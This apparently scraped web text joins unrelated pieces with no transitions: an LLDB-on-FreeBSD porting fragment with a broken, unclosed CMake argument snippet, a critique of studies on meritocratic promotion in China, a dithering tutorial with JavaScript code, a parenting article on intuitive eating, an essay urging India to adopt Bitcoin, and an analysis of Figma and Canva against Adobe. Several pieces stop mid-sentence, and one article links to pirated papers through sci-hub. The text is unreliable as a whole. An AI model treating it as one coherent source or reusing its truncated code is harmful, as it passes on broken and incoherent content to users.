<p>In addition to that, a few additional options needed to be passed
to CMake.  The following snippet explains them, in the Bash array form:</p>
<div><pre><code data-lang="bash">mkdir build.arm64
cd build.arm64

args<span>=(</span>
    <span># Path to the source directory</span>

cmake <span>"</span><span>${</span>args[@]<span>}</span><span>"</span></code></pre></div>
<p>Once LLVM is configured this way, the regular <code>ninja</code> calls can be used
to build the project.  The build system will automatically configure
a <code>NATIVE</code> subdirectory containing utilities that need to be executed
during the build, while the rest of the project will be built for ARM64.</p>
<h2 id="working-on-additional-architectures">Working on additional architectures</h2>
<h3 id="architecture-specific-code-in-lldb">Architecture-specific code in LLDB</h3>
<p>While a significant part of <code>ptrace(2)</code> API used by debuggers,
and therefore of the debugger itself is architecture-agnostic,
it is practically impossible to debug programs without specific support
for the processor in question.  For example, the debugger benefits
from support for deassembling the code, generating function calls,
inspecting registers, etc.</p>
<p>A large part of the architecture support is generic and shared between
different operating systems.  Moreover, a part of FreeBSD-specific
architecture support is shared between the legacy and new plugins.
Therefore, in order to extend the new plugin to support additional
architectures we mostly needed to introduce the ‘glue’ binding the new
plugin with the architecture support.  However, we also had to implement
support for inspecting and modifying registers (in more modern form
than used by the legacy plugin), choosing opcodes for software
breakpoints and fix existing bugs in platform support.</p>
<p>In the following subsections, we will discuss shortly the architectures
we were working on, and the specifics that we needed to research
in order to proceed.</p>
<h3 id="ptrace2-register-groups">ptrace(2) register groups</h3>
<p>Traditionally, the <code>ptrace(2)</code> API defines three pairs of requests
for getting and setting registers, effectively splitting the registers
visible to userland programs into three groups: General-Purpose
Registers (GPRs), Floating-Point Unit Registers (FPRs) and Debug
Registers (DRs).</p>
<p>General-Purpose Registers are the baseline set of processor’s registers
exposed to userland programs.  This group includes generic registers
that can be used to store arbitrary data by the program (usually
integers or memory addresses) and special CPU registers with predefined
meaning.  Two common examples of special registers are the Program
Counter that is used to help the memory address of the code being
executed currently, and the flag register that is used to expose part
of the CPU state and boolean results of executed instructions.</p>
<p>The non-special registers also often have functions predefined
by the platform’s ABI.  For example, often one of the registers
is dedicated to be the Stack Pointer.  While the program could
technically use it on some CPUs for another purpose, it must preserve the original value
for interoperability.</p>
<p>Floating-Point Unit Registers are the registers used to store
and perform computation on floating-point numbers.  This class
of registers is only present on processors implementing hardware
floating-point support.</p>
<p>Finally, Debug Registers are special CPU registers used to aid
debuggers.  Usually, they are used to enable hardware-assisted
breakpoints and watchpoints.</p>
<h3 id="arm-and-aarch64">ARM (and AArch64)</h3>
<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/rpi0.jpg" alt="Raspberry Pi Zero"></p>
<p>ARM is a family CPU architectures maintained by <a href="https://www.arm.com/">ARM Ltd.</a>, primarily used on embedded platforms.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">

	



  <p>China has had double-digit economic growth for nearly three decades. How
can we explain this? In my dissertation, I studied one explanation that
is backed up by a large literature: meritocratic promotion. The idea is
that politicians compete in promotion tournaments, where the politician
with the highest GDP growth rate in their jurisdiction is rewarded by
being promoted. By tying promotion to economic growth, meritocratic
promotion creates strong incentives to boost GDP, and hence helps
explain China’s rapid growth.</p>

<p>When I collected data on prefecture politicians, however, I found no evidence for
meritocracy: there was no correlation between GDP growth and
promotion, despite trying many different models. How is this null result
consistent with the positive findings in the rest of the literature? To
find out, I replicated the main papers claiming evidence for prefecture-level meritocracy. Short answer:
the literature is wrong.</p>

<p>This post summarizes my replications. I find that the results in the
literature are not robust to reasonable specification changes, or are
due to data errors. You can find the full details, and a few more
replications, in the paper <a href="https://michaelwiebe.com/assets/ch2.pdf">here</a>.</p>



<p><a href="https://sci-hub.st/https://doi.org/10.1007/s10887-015-9116-1">Yao and Zhang (2015)</a>, published in the Journal of Economic Growth, was
the first paper to study meritocratic promotion at the prefecture level
in China. They estimate a leader’s ability to grow GDP, and then estimate
the relationship between ability and promotion. If promotion is
meritocratic, we should see a positive correlation, as high-growth
leaders are promoted.</p>

<p>However, they find no average correlation between leader ability and
promotion: leaders with higher ability are not more likely to be
promoted. Despite this, the authors do not frame their paper as
contradicting the literature.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> Moreover, this paper is cited in the
literature as supporting the meritocracy hypothesis.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p>This is because the authors further test for an interaction between
leader ability and age, reporting a positive interaction effect that is
significant at the 5% level. Narrowing in on specific age thresholds,
they find that leader ability has the strongest effect on promotion for
leaders older than 51. They conclude that leader ability matters for
older politicians, because more years of experience produces a clearer
signal of ability.</p>

<p>Now, this result is consistent with a limited promotion tournament,
where the Organization Department promotes older leaders based on their
ability to boost growth (because older leaders have clearer signals of
ability), but applies different promotion criteria to younger leaders
(whose signals are too weak to detect). But this limited model
contradicts the usual characterization of China’s promotion tournament
as including all leaders, irrespective of age: in each province, leaders
compete to boost GDP growth, and the winners are rewarded with
promotion.</p>

<p>This is actually a big discrepancy, because half of all promotions occur
for leaders younger than 51. If the Organization Department cannot
measure ability for these young leaders, what criteria does it use to
promote them? Furthermore, remember that the original motivation was to
explain China’s rapid growth. The incentives generated by this limited
tournament are weaker, since the reward is only applied later in life;
if young leaders are impatient, they will discount this future reward
and put less effort into boosting growth. The limited tournament model
has less explanatory power.</p>

<p>At this point, it is not clear to me why this paper has been cited
without qualification as evidence for meritocratic promotion. It offers
no general support for meritocracy, and its model of a limited promotion
tournament partly contradicts the literature.</p>

<p>But I’m not stopping here. Finding a null average effect with a
significant interaction is a classic formula for p-hacked results in
social psychology. Since the age interaction doesn’t make much sense, I
don’t believe that the authors started out planning to run this test.
Rather, it looks like they wanted to find a positive average effect, but
didn’t. But they’d already invested a lot of time in collecting the data
and working out a clever identification strategy, so they found an
interaction that got them statistical significance, even if the
interpretation wasn’t really consistent. Hence, I <a href="https://michaelwiebe.com/blog/2020/11/pvalues">reject their p-value
as invalid</a>.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></p>

<p>And it turns out that this is the right call. Digging into the paper, I
find that the significant interaction term depends on including
questionable control variables.</p>

<p>When estimating leader ability, the authors regress GDP growth on three
fixed effects (leader, city, year) as well as three covariates: initial
city GDP per capita (by leader term), annual city population, and the
annual provincial inflation rate. I think it makes sense to control for
initial GDP by term. The model includes city effects, so level
differences in growth rates are not an issue. But we might worry that
the variance of idiosyncratic shocks to growth is correlated with city
size, and growth shocks could affect promotion outcomes.</p>

<p>However, it is not clear why population and inflation should be
included. The authors mention that labor migration can drive GDP growth
(p.413), but a leader’s policies affect migration, so population is
plausibly a collider or ‘bad control’, if leader ability affects growth
through good policies that increase migration. The authors provide no
justification for including inflation, which is odd because the
dependent variable (real per capita GDP growth) is already expressed in
real (rather than nominal) terms.</p>

<p>Given the lack of justification for including population and inflation
as covariates, I re-estimate leader ability controlling only for initial
GDP. Using this new estimate of ability, I then replicate their main
results. I again find a nonsignificant average effect of ability on
promotion. But now the interaction with age disappears. The sign remains
positive, but the magnitude of the coefficient drops by half, and the
results are nonsignificant.</p>

<p>So it turns out that Yao and Zhang (2015) offers no evidence for
meritocratic promotion of prefecture leaders.</p>



<p><a href="https://sci-hub.st/https://doi.org/10.1093/ej/uez018">Li et al. (2019)</a>, published in the Economic Journal, studies GDP growth
targets and promotion tournaments in China. They start with the
observation that growth targets are higher at lower levels of the
administration; for example, prefectures set higher targets than do
provinces. Their explanation is that the number of jurisdictions
competing in each promotion tournament is decreasing as one moves down
the hierarchy, which increases the probability of a leader winning the
tournament. As a consequence, leaders exert more effort, and
higher-level governments can set higher growth targets without causing
leaders to quit.</p>

<p>As part of their model, they assume that promotion is meritocratic:
performance (measured by GDP growth) increases the probability of
promotion. Further, they report an original result: the effect of
performance on promotion is increasing in the growth target faced. That
is, a one percentage-point increase in growth will increase a mayor’s
chances of promotion by a larger amount when the provincial target
is higher, relative to when the target is lower.</p>

<p>This result seems naturally testable by interacting
\(Growth \times Target\) in a panel regression, with a predicted positive
coefficient on the interaction term. However, the authors argue that OLS
is invalid, instead reporting results based on maximum likelihood where
promotion is determined by a contest success function. Why does OLS not
apply? “Standard linear regression does not work here partly because
promotion is determined by local officials’ own growth rates as well as
by the growth rates of their competitors. The nonlinearity of the
promotion function is another factor that invalidates the OLS
estimation.” (p.2906)</p>

<p>But these are not problems for OLS. First, as is standard in this
literature, the promotion tournament can be captured by using prefecture
growth rates relative to the annual provincial growth rate. Second, OLS
is the best linear approximation to a nonlinear conditional expectation
function. So if there is a positive nonlinear relationship between
promotion and growth, we should be expect that it will be detected by
OLS.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></p>

<p>Given the lack of justification for omitting results from linear
regression, I replicate their results using a linear probability model
and logistic regression. First, I test the generic meritocracy
hypothesis. I find that GDP growth has no average effect on promotion.
Next, I do find a positive interaction effect between growth and growth
target, but it’s not statistically significant.</p>

<p>This doesn’t look good for the authors. OLS is the default method, and
you need a strong justification for not reporting it. But their reasons
are flimsy. Now it looks like they tried OLS, didn’t get the result they
wanted, then made up a complicated maximum likelihood model that
delivered significance.</p>

<p>So Li et al. (2019) is another paper that claims to provide evidence for
meritocratic promotion of prefecture leaders, but is unable to back up
those claims.</p>



<p><a href="https://sci-hub.st/https://doi.org/10.1093/qje/qjy027">Chen and Kung (2019)</a>, published in the Quarterly Journal of Economics,
studies land corruption in China, with secondary results on meritocratic
promotion. The main result is that local politicians provide price
discounts on land sales to firms connected to Politburo members, and
these local politicians are in turn rewarded with promotion up the
bureaucratic ladder.</p>

<p>For provincial leaders, they find a strong effect of land sales on
promotion for secretaries, but not for governors. In contrast, GDP
growth strongly predicts promotion for governors, but not secretaries.
They conclude that “the governor has to rely on himself for promotion,
specifically by improving economic performance or GDP growth in his
jurisdiction [...] only the provincial party secretaries are being
rewarded for their wheeling and …</p></div></div>

<p>Beyond <a href="https://en.wikipedia.org/wiki/Susan_Kare">Susan Kare’s</a> brilliant type design and pixel-art icons, a cornerstone of the visual vocabulary of the Macintosh is the use of dithered images. Dithering algorithms use a small palette (in our case, black and white) to represent a larger one (simulated grayscale). Here we will examine two popular techniques: Floyd-Steinberg dithering, and a variation common on the Macintosh, Atkinson dithering.</p>

<h2 id="floyd-steinberg">Floyd-Steinberg</h2>

<p>The central idea of Floyd-Steinberg dithering is <em>error diffusion</em>. When determining the 1-bit color to assign to a given pixel in a grayscale image, quantizing will result in some error- a pixel either <em>darker</em> or <em>lighter</em> than the true grayscale value. By “pushing” this rounding error to neighboring pixels, we can ensure that <em>on average</em> the distribution of black and white in the output image resembles the input. Your eye closes the gap, and reconstructs some of the lost information.</p>

<p>Floyd-Steinberg dithering scans input pixels in a single pass, top-to-bottom and left-to-right. Error left over from each pixel is distributed between neighboring pixels which have not been converted yet, in the following proportions:</p>

<figure>

	<figcaption>Floyd-Steinberg error diffusion</figcaption>
</figure>

<p>Suppose we have the <em>[0.0,1.0]</em> grayscale values of an image in an array <code>pixels</code> and the width of the image <code>w</code>, and we wish to generate an array of <em>{0,1}</em> output pixels. If we are permitted to mutate <code>pixels</code> in-place, a JavaScript implementation of the algorithm might look something like the following:</p>

<pre><code>function floyd(pixels,w) {
	const m=[[1,7],[w-1,3],[w,5],[w+1,1]]
	for (let i=0; i&lt;pixels.length; i++) {
		const x=pixels[i], col=x&gt;.5, err=(x-col)/16
		m.forEach(([x,y]) =&gt; i+x&lt;pixels.length &amp;&amp; (pixels[i+x]+=err*y))
		pixels[i]=col
	}
	return pixels
}
</code></pre>

<p>Given a <em>mask</em> (<code>m</code>) of relative offsets to neighbor pixels and the proportion of error they should get, we map over our pixels in order. The <em>color</em> at each pixel (<code>col</code>) is a simple quantization of the grayscale value (<code>x&gt;.5</code>), the <em>error</em> (<code>err</code>) is the difference between this quantized value and the original, and we simply add a fraction of that error to neighbor pixels before returning <code>col</code>.</p>

		</div>
	</div>
</figure>

<p>Note that in this implementation error diffused from the right edge of the image will bleed into the left edge of the following row. The inherent noisyness of dithering makes this aesthetically irrelevant, and doing so simplifies the implementation. Everyone wins!</p>

<p>If we wanted to avoid modifying <code>pixels</code> in-place, we could observe that the accumulated error we care about would fit in a fixed-size circular buffer (<code>e</code>) proportional to the width of our image. The result is slightly more complex, but in some ways conceptually cleaner, since our main loop is now a <code>map()</code>:</p>

<pre><code>function floyd2(pixels,w) {
	const e=Array(w+1).fill(0), m=[[0,7],[w-2,3],[w-1,5],[w,1]]
	return pixels.map(x =&gt; {
		const pix=x+(e.push(0),e.shift()), col=pix&gt;.5, err=(pix-col)/16
		m.forEach(([x,y]) =&gt; e[x]+=err*y)
		return col
	})
}
</code></pre>

<p>(<code>Array.shift()</code> and <code>Array.push()</code> are used here for conciseness; use your imagination for a more efficient low-level implementation.)</p>

<h2 id="atkinsonsalgorithm">Atkinson’s Algorithm</h2>

<p>Apple’s <a href="https://en.wikipedia.org/wiki/Bill_Atkinson">Bill Atkinson</a> developed a variation of the above technique which produces results that are subjectively nicer-looking. The basics work the same, but error is spread in a broader pattern, and only 3/4ths of the error is preserved:</p>

<figure>
	<img src="http://beyondloom.com/blog/dither-figures/atkinson.png">
	<figcaption>Atkinson error diffusion</figcaption>
</figure>

<p>Modifying <code>floyd2()</code> above, we can simplify <code>m</code>, as all the error is propagated in an even proportion. The sliding error window <code>e</code> now needs to be roughly twice as large to account for the broader spread pattern:</p>

<pre><code>function atkinson(pixels,w) {
	const e=Array(2*w).fill(0), m=[0,1,w-2,w-1,w,2*w-1]
	return pixels.map(x =&gt; {
		const pix=x+(e.push(0),e.shift()), col=pix&gt;.5, err=(pix-col)/8
		m.forEach(x =&gt; e[x]+=err)
		return col
	})
}
</code></pre>

	</div>
</figure>

<p>Compared side-by-side with Floyd-Steinberg dithering, Atkinson’s algorithm seems to produce richer contrast, at the cost of some detail in very light or dark areas of the image.</p>

<h2 id="ditheringinike">Dithering in iKe</h2>

<p>Readers of this blog might be curious to know what Atkinson dithering would look like in <a href="https://github.com/JohnEarnest/ok/tree/gh-pages/ike">iKe</a>.</p>

<p>We can leverage iKe’s capabilities for loading remote images via the special <code>/i</code> operative. By specifying the built-in palette <code>gray</code>, the input image will be converted into a matrix of <em>[0,255]</em> grayscale values. To resize the iKe graphics window to match the image, we initialize the magic variables <code>w</code> and <code>h</code> based on the dimensions of this matrix. Our running error window is stored in a global (<code>e</code>) initialized with two rows worth of zeroes (<code>&amp;2*w</code>). The definition of our mask <code>m</code> is virtually identical to the JavaScript version above.</p>

<p>Most of the work happens in <code>d</code>, which is meant to dither one pixel. We find the value of the current pixel, incorporating accumulated error (<code>p:x+*e</code>), quantize the output color (<code>c:p&gt;.5</code>), shift out the consumed error value and shift in a zero (<code>e::1_e,0</code>), and then <em>amend</em> <code>e</code> by adding the error at the current pixel at every index in our mask <code>m</code> (<code>@[`e;m;+;(p-c)%8]</code>).</p>

<p>To dither the entire image, we explicitly apply <code>d</code> to each pixel of the matrix, remembering to first rescale the input <em>[0,255]</em> palette indices into floating point <em>[0.0,1.0]</em> values. For an animated application of this code, it would be necessary to reset <code>e</code> after each frame.</p>

<pre><code>/i pixels;gray;https://i.imgur.com/Lcq4Xi4.png
w: #*pixels
h: #pixels
e: &amp;2*w
m: (0;1;w-2;w-1;w;2*w-1)
d: {p:x+*e; c:p&gt;.5; e::1_e,0; @[`e;m;+;(p-c)%8]; c}
,(;;d''pixels%255)
</code></pre>

<p><em>Parental anxieties can damage kids’ relationship with food</em></p>



<p><em><sub>(The below completed story, assigned to me by <strong>Optimum Wellness</strong>, is posted here with permission from my editor. It’s been held indefinitely as Covid has affected many magazines’ page counts, but I wanted to get it out there as I really enjoyed this one!)</sub> </em></p>







<p>By Sarah Protzman Howlett</p>



<p>As parents, it can be a tall order to foster positive body image and a healthy relationship with food in our kids when both are sore subjects in our own lives. The new book&nbsp;“<a href="https://www.amazon.com/Parents-Guide-Intuitive-Eating-Healthy/dp/1612439330">A Parent’s Guide to Intuitive Eating</a>” by pediatrician <a href="https://www.doctoryami.com/">Dr. Yami&nbsp;Cazorla-Lancaster</a> helps parents navigate these confusing waters using the principles of intuitive eating, a so-called “anti-diet” that eschews food restrictions. In the book, Dr. Yami outlines five pillars she says will help parents cultivate adventurous, joyful meal times for everyone at the table, no matter what hang-ups lurk in your past.</p>



<p><strong>Honor hunger and satiety</strong></p>



<p>Parents should decide what food to serve and when, Dr. Yami says—and then? <em>Shhhh</em>. “After you’ve presented the food, your job is done,” she says. Steer clear of any goading: <em>Come on, have another bite! Don’t you want more? You didn’t even touch your broccoli. If you want dessert, you have to eat your…</em> are all counterproductive, she says. Instead, let the child know they will never be forced to eat but that they must use manners, perhaps remaining at the table until everyone is done eating. Parents who are fearful their child is too small or too large seem to struggle most with this one, Dr. Yami says: “When a parent is anxious about a kid who is larger or more robust, or is very lean or petite, they’ll start urging a few more bites and so forth,” she says. “In other words, intervening when the child should be using their own intuition.”</p>



<p><strong>Emphasize whole-plant foods</strong></p>



<p>This phrasing intimidates many parents, Dr. Yami says, because it conjures images of salad and little else, when in reality plant-based eating is much broader. Think beyond mere leaves and create meals around the foods kids almost universally love that also happen to be plants: potatoes, corn, fruit, etc. Plant-forward meals decrease the risk of chronic disease and increase longevity, she says, and are packed with fiber and antioxidants. Avoid restrictive diets, especially ones that forbid foods widely considered healthy, she says: “The Paleo diet eliminates beans and whole grains, which are very health promoting and support the gut microbiome,” she says, “and fad diets like Keto can be incredibly dangerous for kids because of the lack of macronutrients. We can have carbs and fat as part of delicious, abundant meals.”</p>



<p><strong>Establish a positive environment</strong></p>



<p>Dr. Yami urges filling your home with health-promoting foods, making sure what’s available matches the messaging: “If you tell your kids to eat fruits and vegetables but there are chips everywhere, you’re not giving the brain and the eyes an opportunity to make those things part of kids’ consciousness,” she says. Further, examine what body-image messages your kids may be absorbing, through TV, social media and films, or hearing talk about dieting or body size—be it yours or someone else’s. “You may be telling your kids ‘all bodies are good bodies’ but have a magazine that says LOSE 10 POUNDS on the cover,” she says. “You put the culture into your child’s brain.”</p>



<p><strong>Be flexible</strong></p>



<p>Parents should feel free to honor the cultural importance of, for instance, cake at birthday parties, candy on Halloween and chocolate bunnies on Easter—again, without additional commentary that can instill guilt. “When they eat their cake, don’t give them the side eye or say something like, ‘I think you’ve had enough,’ ” she says. For older kids, Dr. Yami advises candid conversations about sugar, salt and fat—and how we as humans are naturally driven to eat those things because they taste good. For parents with younger kids, the temptation to forbid sugar can backfire once a child goes to school and sees other kids enjoying such foods in moderation. Denying access to sweets or other foods deemed “bad” can lead kids to hoard food, binge or hide candy wrappers in their pockets, she says.</p>



<div><p><strong>Relax and have fun</strong></p><p>Dr. Yami says too many parents in her practice deal with crushing guilt and shame over any number of parenting issues, but that tensions run highest where food is concerned. “Parents are so anxious, and the dinner table becomes stressful,” she says. “When it comes to food, parents do not need to be saints or be perfect. Their kid is going to be <em>fine</em>. We are not trying to feed them enough broccoli to get into Harvard.” She says that if a parent is getting whole-plant foods into their child’s diet, to not overthink the rest. Pressure and perfectionism zaps all joy from family mealtimes; she says. “Your kids love you, so give yourself space and time to try different things,” she says. “You do not have to get everything right all the time.”</p></div>



<div><p><strong>&gt;&gt; No “bad” foods</strong></p><p>In Dr. Yami’s family, no nosh is forbidden. But this cornerstone of intuitive eating—that no food is banned or off limits—doesn’t ignore the fact that some foods pack more nutrition than others. “I call them ‘health-promoting foods’ and ‘play foods,’ ” she says. “Play foods are fun but are probably more processed, and we won’t eat them all the time.” Regardless of what your kids may hear at school—that certain foods are “good” and others are “bad”—parents who reject this rigid way of thinking about food must say so, and say so often. “You can say, ‘Some foods help us feel better and have more health benefits than other foods, but nothing is off limits,’ ” she says. “That gives kids the ability to keep foods on an even platform.”</p></div>

                        <p>India <em>should</em> launch a digital rupee – and back it with digital gold. More broadly, India should champion decentralized cryptocurrencies like Bitcoin and Ethereum to safeguard national security, prevent deplatforming, attract international capital, strengthen monetary policy, deter financial fraud, accelerate technological development, and hasten India’s ascendance as a global power.</p><p>We make this case below. But if you haven't been following cryptocurrency closely, or India's <a href="https://www.cnbc.com/2021/01/30/the-indian-government-may-ban-cryptocurrencies-like-bitcoin.html">proposed ban</a>, don't worry. Our first step is to review the basics for folks new to the space before explaining why Prime Minister Modi should <em>buy</em> Bitcoin rather than <em>ban </em>Bitcoin, and how India can use crypto to regain its rightful place on the world stage.</p><h2 id="1-crypto-is-now-a-trillion-dollar-industry">1. Crypto is now a Trillion Dollar Industry</h2><p>Bitcoin was invented in 2009 by a pseudonymous engineer named Satoshi Nakamoto. His creation solved an <a href="https://medium.com/swlh/bitcoins-proof-of-work-the-problem-of-the-byzantine-generals-33dc4540442">unsolved problem</a> in computer science and created a trillion dollar industry.</p><p>Yes, you read that right: <em>trillion</em>. In June 2010 the value of all cryptocurrency worldwide was $0. As of <a href="https://coinmarketcap.com/charts/">today</a>, it's $1.1 trillion. Bitcoin alone is worth more than $600 billion. That's more valuable than any of the tech unicorns founded in the last decade, more valuable than Uber, Airbnb, Stripe, and Slack combined.</p><figure><img src="https://balajis.com/content/images/2021/02/image.png" alt="" srcset="https://balajis.com/content/images/size/w600/2021/02/image.png 600w, https://balajis.com/content/images/2021/02/image.png 783w" sizes="(min-width: 720px) 720px"><figcaption>A trillion here, a trillion there, soon you're talking real money!</figcaption></figure><p>So in retrospect, Bitcoin was the most economically important technological innovation of the 2010s, like the internet was to the 90s.

But Bitcoin is more akin to <a href="https://www.reuters.com/article/us-crypto-currencies-jpm-idUSKBN29A1IF">digital gold</a>, and cannot be frozen or seized by any state.</p><p>It is this property that makes Bitcoin so precious for safeguarding Indian national security. A network that cannot be shut down by any state is a network that India and its diaspora can rely upon in times of conflict. For the same reason that Germany recently repatriated <a href="https://www.dw.com/en/germany-repatriates-gold-reserves-ahead-of-schedule/a-40208045">3,378 tons of gold</a> from the United States, India should prioritize national support for digital gold as a financial rail of last resort in a situation like the 2008 financial crisis or the 2020 COVID crash.</p><p>Similarly, for the same reason that <a href="https://abcnews.go.com/International/wireStory/mexico-leader-condemns-twitter-facebook-blocking-trump-75123130">Mexico</a>, <a href="https://www.bloomberg.com/news/articles/2021-01-11/merkel-sees-closing-trump-s-social-media-accounts-problematic">Germany</a>, and <a href="https://fortune.com/2021/01/11/problematic-twitter-merkel-france-trump/">France</a> expressed concern over the deplatforming of a sitting US president and his followers by a collection of American tech companies, India should prioritize national support for decentralized platforms like Ethereum to create social networks and messaging apps that US corporations can’t shut down. Part of the solution will also be <a href="https://twitter.com/balajis/status/1347902693537239040">national replacements</a> for Twitter, but non-Indians won't be on Indian Twitter, and India will still need to get messages out to the world on neutral international platforms. That's what crypto permits.</p><p>Note that the risk of political deplatforming is not theoretical. Once you’ve banned the “most powerful man in the world”, it’s no big deal to ban anyone else. Every day brings another headline to this effect. Recall too (a) that the US already once <a href="https://www.washingtonpost.com/news/worldviews/wp/2016/06/06/from-pariah-to-capitol-hill-narendra-modis-extraordinary-rise/">banned then-Chief Minister Modi’s physical entry</a> for many years and (b) that millions of Indians are currently <a href="https://www.similarweb.com/apps/top/google/app-index/in/all/top-free/">dependent</a> on American apps like Twitter, WhatsApp, Facebook, Gmail, PayPal, and Google Pay. Given sufficient negative press, American technology companies may ban the Indian Prime Minister or Indian citizens not just from entering the US, but from much of the internet itself. And not just from communicating over the internet, but from sending and receiving payments over US-controlled platforms like <a href="https://qz.com/1893235/swift-transfer-system-leaves-china-vulnerable-to-us-sanctions/">SWIFT</a>, PayPal, or Google Pay.</p><p>What could catalyze such an event? Well, America is excitable these days. A <a href="https://www.motherjones.com/politics/2019/08/amazon-viral-fire-photos-fake-misleading-leonardo-dicaprio/">fake photo</a> of a Brazilian rainforest fire was published in the New York Times and prompted a writer in the Atlantic to call for the <a href="https://www.theatlantic.com/ideas/archive/2019/08/amazon-fires-show-limits-sovereignty/596779/">invasion of Brazil</a>. Cooler heads prevailed once the photo was revealed to be fake, but next time it's India that may be the target of official misinformation. And digital hostilities may commence with little warning.</p><p>In short, the threat of Chinese espionage against India is obvious and has already been acted upon with the <a href="https://asia.nikkei.com/Business/Technology/India-permanently-bans-TikTok-and-58-other-Chinese-apps#:~:text=The%20ministry's%20June%20order%20stated,of%20state%20and%20public%20order.%22">TikTok ban</a>, but the threat that arbitrary deplatforming by US corporations poses to India's national sovereignty is in some respects even greater. Crypto fixes this, as decentralization defeats deplatforming.</p><h2 id="3-foreign-investment-crypto-brings-capital-to-india">3.

<p><strong>How Figma and Canva are taking on Adobe—and winning</strong></p>



<p>In 2010, Photoshop was ubiquitous. Whether you were editing a photo, making a poster, or designing a website, it happened in Photoshop.&nbsp;</p>



<p>Today, Adobe looks incredibly strong. They’ve had spectacular stock performance, thanks to clear-eyed management who’ve made bold bets that have paid off. Their transition to SaaS has been seamless, for which the public markets have rewarded them handsomely. And they’re historically one of the <a href="https://en.wikipedia.org/wiki/List_of_acquisitions_by_Adobe">best companies at M&amp;A</a>; their product lineup is a testament to their ability to acquire new product lines and integrate them well into their multi-product ecosystem. Perhaps most importantly and least appreciated, they have dramatically sped up the cadence of their internal product development process and feedback loop. Like Microsoft, they have successfully shifted from a legacy company operating on an annual (or longer) release schedule to a truly cloud company shipping updates at a sub-weekly pace.</p>



<p>Nevertheless, there are a few segments of design where they’re no longer the market leader. Companies like Figma, Sketch, and Canva are examples of products that have been able to become top products despite Adobe’s ubiquity in all things design. Figma showed up in Adobe’s annual report for the first time in <a href="https://www.bamsec.com/filing/79634320000013">2019</a>. They reprised in <a href="https://www.bamsec.com/filing/79634321000004">2020</a>, and I’m not uncertain they will continue to be in it going forward.</p>



<p>How should we understand these market transitions and why these young companies are able to thrive, even against a strong incumbent like Adobe?</p>



<p>These companies have distinct atomic concepts from Adobe. The primitives that their products are built around are fundamentally different from those of Adobe’s product lineup. It’s these different fundamental atomic concepts that turn Adobe’s advantage of an established product and existing userbase into a weakness that hinders their ability to counter these upstarts. The opportunity for these new atomic concepts to thrive is driven by the new use cases and types of users unearthed during market transitions.</p>



<p>Understanding the phases of market transition and what drives them is a universal process worth examining.</p>



<h2>New use cases: designing for digital</h2>



<p>For most markets, there are advantages to being an incumbent. Markets converge as companies arrive at the preference frontier of customers. This leaves little potential energy for new startups to take advantage of.</p>



<p>Market entropy is good for new entrants.</p>



<p>It’s not impossible to break into a market by brute force, but it’s hard. Very hard. Most successful companies, especially startups, have found tailwinds to harness that help pull them forward.</p>



<p>Changing customer needs are the largest source of entropy in markets. When customer needs rapidly change, there is less advantage in being an incumbent. Instead, legacy companies are left with all the overhead and a product that no longer is what customers want.</p>



<p>There are many causes of changing customer needs. Often there are new and growing segments of customers with different use cases. Existing products may work for them, but they aren’t ideal. The features they care about and how they value them are very different from the customers the legacy company is used to. Companies resist changing core parts of their product for every new use case since it’s costly in work, money, and attention. But every once in a while, what was once a small use case grows into one large enough to support its own company.</p>



<p>Other times the scale or dynamics of a market shift enough to make a product no longer work despite having been a great fit. Companies are often caught flat-footed by these situations because what they have done successfully for years suddenly starts to falter—and they aren’t sure why. Ebay is a good example of this. Their decentralized auction model was very good in a nascent internet economy when there was a scarcity of items being sold online. Once ecommerce became commonplace, price and speed became much more important factors and Ebay’s decentralized model was at a disadvantage. Amazon was much better at building economies of scale in this post-liquidity ecosystem.</p>



<p>Another source is when the customers themselves change. Often the function of a tool remains the same, but the type of user changes. These new types of customers often have different things they care about and resulting product needs.</p>



<p>The internet drove entirely new design use cases. Photoshop was built for editing photos and images. It’s a powerful tool that operates at the pixel level. However, many of these new uses weren’t about image manipulation. Images were a component—not the essence—of the job users were trying to accomplish.</p>



<p>For some users, this was designing digital products. Designers at software companies or any company with a website wanted to create the websites and software products they worked on. This is less about image manipulation and more about designing the UI and UX of these digital products. Vectors are more important than raster graphics. The complexity and process of designing these high-value designs also got increasingly more sophisticated. These designers worked with teams of other designers and non-designers. Their designs are part of a larger product development process and what mattered wasn’t just making a design, but how that the entire process could be improved to make collaboration easier and handoff of designs better. Iteratively.</p>



<p>The complexity of the designs and the components in the resulting code became more complex, too. The need for their tools to have a higher-level understanding of the components and variants became more important. It’s increasingly useful for designs to understand the same concepts and abstraction levels as the HTML and CSS in the resulting end product.</p>



<p>For some users, this was designing content for social platforms, digital ads, or even wedding invitations. These were often made in Photoshop, but again, pixels are the wrong abstraction level. Images are not the sole component; they are just past of a larger design that includes graphics, text, and more. Similarly, the customers are very different. Many of the people now doing what is, in essence, design work don’t think of themselves as designers. They just have a very specific thing they want to create, with the least friction possible.</p>



<p>The internet dramatically scales up the volume and type of new use cases for design. In many ways, this helps Adobe. With platforms like Instagram, the number of people editing photos has expanded by many orders of magnitude. While editing on platforms like Instagram may have increased significantly, Adobe has been a huge beneficiary of the internet and the shift to cloud—and their <a href="https://www.google.com/finance/quote/ADBE:NASDAQ">stock price</a> is a testament to this.</p>



<p><em>[KK Note: Platforms like Instagram strapping editors onto their social platforms and eating into Lightroom from the bottom up is well worth its own discussion. And perhaps someone will convince Mike Krieger to do the definitive piece on that.]</em></p>

But it’s also building new worlds? I’m going to need a refresher on remembering the Andreessen Horowitz talking points</figcaption></figure>



<p>This is even more true in video. There are orders of magnitude more video creators as the ability to record video has become ubiquitous and the platforms where video is the default format have grown. Even more striking, many of the dominant video platforms—like Youtube—are purely distribution focused. They don’t even have any editing capabilities. Instead, companies like Adobe end up being large beneficiaries of this need.</p>



<p><em>[KK Note: Platforms like Youtube still having not built any semblance of an editor into their platform is *also* well worth its own discussion. I’d say we’ll never know what could be, but then I look at TikTok and all is right with the world.]</em></p>



<p>But Adobe hasn’t captured it all. And in many of these new emergent use cases and customer types, Adobe has lost the lead to new startups.</p>



<h2>Tapping into the right level of abstraction</h2>



<p>The best products map to how customers think about their workflow. They match the abstraction level of their customers: not too high that it’s unusable, but not too low that it’s hard to use easily or extend in more complex ways.</p>



